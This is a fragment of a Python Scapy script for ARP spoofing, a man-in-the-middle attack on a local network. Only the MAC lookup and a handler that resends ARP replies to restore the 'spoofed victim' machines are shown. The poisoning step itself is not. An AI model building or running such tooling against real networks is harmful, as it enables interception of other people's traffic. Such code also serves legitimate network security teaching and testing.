...
def getMAC(ip):
    try:
        # Scapy Command to send ARP Request and return ARP Reply
        val = arping(ip)
...
def signal_handler(signal, frame):
    ...
    send(ARP(op=2, pdst=ip_addr1, psrc=ip_addr2,
             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=mac_addr2), count=3)
    # Release the ARP spoofed Victim Machine
    send(ARP(op=2, pdst=ip_addr2, psrc=ip_addr1,
             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=mac_addr1), count=3)
